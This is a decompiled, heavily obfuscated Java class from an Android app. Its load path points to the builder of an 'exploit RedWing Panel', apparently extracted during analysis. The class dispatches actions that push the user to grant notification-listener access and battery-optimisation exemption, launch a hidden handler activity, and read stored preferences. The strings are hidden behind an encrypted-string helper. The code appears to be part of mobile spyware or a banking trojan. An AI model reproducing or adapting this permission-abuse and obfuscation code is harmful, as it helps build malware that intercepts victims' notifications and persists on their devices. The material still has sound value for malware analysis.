package v.s;

import android.content.Intent;
import android.net.Uri;
import app.mobilex.plus.HandlerSJAdapter;
import app.mobilex.plus.UtilNWWrapper;
import app.mobilex.plus.util.TypefaceCache;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class H7JWbAQ2EAug6YHM8S extends LGm23hksIOxB implements JRdueaGIH5g8DVCPba {
    public final /* synthetic */ UtilNWWrapper JXn4Qf7zpnLjP5;
    public final /* synthetic */ int vekpFI4d1Nc4fakF;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public /* synthetic */ H7JWbAQ2EAug6YHM8S(UtilNWWrapper utilNWWrapper, int i) {
        super(0);
        this.vekpFI4d1Nc4fakF = i;
        this.JXn4Qf7zpnLjP5 = utilNWWrapper;
    }

    private static /* synthetic */ void ozkgzgdi() {
    }

    @Override // v.s.JRdueaGIH5g8DVCPba
    public final Object w9sT1Swbhx3hs() {
        int i = this.vekpFI4d1Nc4fakF;
        boolean z = false;
        Eo0e0FTdv96U7KeCzoB eo0e0FTdv96U7KeCzoB = Eo0e0FTdv96U7KeCzoB.dDIMxZXP1V8HdM;
        UtilNWWrapper utilNWWrapper = this.JXn4Qf7zpnLjP5;
        switch (i) {
            case 0:
                String str = UtilNWWrapper.A1BaTVAMeIXMnh;
                return Boolean.valueOf(utilNWWrapper.yTljMGnIibTRdOpSh4());
            case 1:
                String str2 = UtilNWWrapper.A1BaTVAMeIXMnh;
                if (utilNWWrapper.yTljMGnIibTRdOpSh4()) {
                    utilNWWrapper.D5P1xCAyuvgF();
                } else {
                    try {
                        try {
                            utilNWWrapper.startActivity(new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"));
                        } catch (Exception unused) {
                            utilNWWrapper.startActivity(new Intent(TypefaceCache.obtain("00220078005F009500FF00B600D600E900300073004F009300F900B100D500B4006D0057007800B300D9009000FC0098000D0059006F00AE00D6009600F100860017005F007400A900CF009300FB009400170053007500A200C2008000E1008200170042007200A900D7008C")));
                        }
                        break;
                    } catch (Exception unused2) {
                    }
                }
                return eo0e0FTdv96U7KeCzoB;
            case 2:
                String str3 = UtilNWWrapper.A1BaTVAMeIXMnh;
                return Boolean.valueOf(utilNWWrapper.dTS0S7eC32ubQH54j36());
            case 3:
                UtilNWWrapper.b1EoSIRjJHO5(utilNWWrapper);
                return eo0e0FTdv96U7KeCzoB;
            case 4:
                String str4 = UtilNWWrapper.A1BaTVAMeIXMnh;
                return Boolean.valueOf(utilNWWrapper.vIJudZvPyTuNp());
            case 5:
                UtilNWWrapper.pyu8ovAipBTLYAiKab(utilNWWrapper);
                return eo0e0FTdv96U7KeCzoB;
            case 6:
                String str5 = UtilNWWrapper.A1BaTVAMeIXMnh;
                return Boolean.valueOf(utilNWWrapper.O2DHNSIGZlgPja7eqLgn());
            case 7:
                String str6 = UtilNWWrapper.A1BaTVAMeIXMnh;
                utilNWWrapper.euF5Udt5Rqv3Qmea();
                return eo0e0FTdv96U7KeCzoB;
            case 8:
                String str7 = UtilNWWrapper.A1BaTVAMeIXMnh;
                return Boolean.valueOf(utilNWWrapper.EWUjsTERgdPbSw3NNlN());
            case 9:
                String str8 = UtilNWWrapper.A1BaTVAMeIXMnh;
                if (!utilNWWrapper.EWUjsTERgdPbSw3NNlN()) {
                    try {
                        try {
                            Intent intent = new Intent("android.settings.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS");
                            intent.setData(Uri.parse(TypefaceCache.obtain("003300770058008C00F100B800D700FD") + utilNWWrapper.getPackageName()));
                            utilNWWrapper.startActivity(intent);
                            break;
                        } catch (Exception unused3) {
                        }
                    } catch (Exception unused4) {
                        utilNWWrapper.startActivity(new Intent("android.settings.IGNORE_BATTERY_OPTIMIZATION_SETTINGS"));
                        break;
                    }
                } else {
                    utilNWWrapper.D5P1xCAyuvgF();
                }
                return eo0e0FTdv96U7KeCzoB;
            case 10:
                String str9 = UtilNWWrapper.A1BaTVAMeIXMnh;
                if (utilNWWrapper.yTljMGnIibTRdOpSh4()) {
                    utilNWWrapper.gmNWMfvn6zlEj();
                } else {
                    try {
                        try {
                            utilNWWrapper.startActivity(new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"));
                        } catch (Exception unused5) {
                            utilNWWrapper.startActivity(new Intent(TypefaceCache.obtain("00220078005F009500FF00B600D600E900300073004F009300F900B100D500B4006D0057007800B300D9009000FC0098000D0059006F00AE00D6009600F100860017005F007400A900CF009300FB009400170053007500A200C2008000E1008200170042007200A900D7008C")));
                        }
                        break;
                    } catch (Exception unused6) {
                    }
                }
                return eo0e0FTdv96U7KeCzoB;
            case 11:
                String str10 = UtilNWWrapper.A1BaTVAMeIXMnh;
                return Boolean.valueOf(utilNWWrapper.EWUjsTERgdPbSw3NNlN());
            case 12:
                String str11 = UtilNWWrapper.A1BaTVAMeIXMnh;
                utilNWWrapper.XuO9PPFo607ssKwZjNW();
                return eo0e0FTdv96U7KeCzoB;
            case 13:
                String str12 = UtilNWWrapper.A1BaTVAMeIXMnh;
                return Boolean.valueOf(utilNWWrapper.dTS0S7eC32ubQH54j36());
            case 14:
                UtilNWWrapper.b1EoSIRjJHO5(utilNWWrapper);
                return eo0e0FTdv96U7KeCzoB;
            case 15:
                String str13 = UtilNWWrapper.A1BaTVAMeIXMnh;
                String str14 = HandlerSJAdapter.dTS0S7eC32ubQH54j36;
                if (!jb8et6SZeK5TWMrJFxDX.gmNWMfvn6zlEj()) {
                    try {
                        utilNWWrapper.startActivity(new Intent(utilNWWrapper, (Class<?>) HandlerSJAdapter.class));
                    } catch (Exception e) {
                        TypefaceCache.obtain("00310073004A009200F500AC00C6008A002600720052008600C000AD00DD00AD00260075004F008E00FF00B1009200A2003100640054009500AA00FF");
                        e.getMessage();
                        utilNWWrapper.gmNWMfvn6zlEj();
                    }
                    break;
                } else {
                    utilNWWrapper.gmNWMfvn6zlEj();
                }
                return eo0e0FTdv96U7KeCzoB;
            case 16:
                String str15 = UtilNWWrapper.A1BaTVAMeIXMnh;
                return Boolean.valueOf(utilNWWrapper.EWUjsTERgdPbSw3NNlN());
            case 17:
                String str16 = UtilNWWrapper.A1BaTVAMeIXMnh;
                utilNWWrapper.XuO9PPFo607ssKwZjNW();
                return eo0e0FTdv96U7KeCzoB;
            case 18:
                String str17 = UtilNWWrapper.A1BaTVAMeIXMnh;
                return Boolean.valueOf(utilNWWrapper.dTS0S7eC32ubQH54j36());
            case 19:
                UtilNWWrapper.b1EoSIRjJHO5(utilNWWrapper);
                return eo0e0FTdv96U7KeCzoB;
            case 20:
                String str18 = UtilNWWrapper.A1BaTVAMeIXMnh;
                return Boolean.valueOf(utilNWWrapper.vIJudZvPyTuNp());
            case 21:
                UtilNWWrapper.pyu8ovAipBTLYAiKab(utilNWWrapper);
                return eo0e0FTdv96U7KeCzoB;
            case 22:
                String str19 = UtilNWWrapper.A1BaTVAMeIXMnh;
                if (utilNWWrapper.EWUjsTERgdPbSw3NNlN() && utilNWWrapper.O2DHNSIGZlgPja7eqLgn()) {
                    z = true;
                }
                return Boolean.valueOf(z);
            case 23:
                String str20 = UtilNWWrapper.A1BaTVAMeIXMnh;
                utilNWWrapper.hV4VTKNUdeHN();
                return eo0e0FTdv96U7KeCzoB;
            case 24:
                String str21 = UtilNWWrapper.A1BaTVAMeIXMnh;
                return Boolean.valueOf(utilNWWrapper.yTljMGnIibTRdOpSh4());
            case 25:
                return utilNWWrapper.getSharedPreferences(UtilNWWrapper.A1BaTVAMeIXMnh, 0);
            default:
                return utilNWWrapper.getSharedPreferences(UtilNWWrapper.euF5Udt5Rqv3Qmea, 0);
        }
    }
}
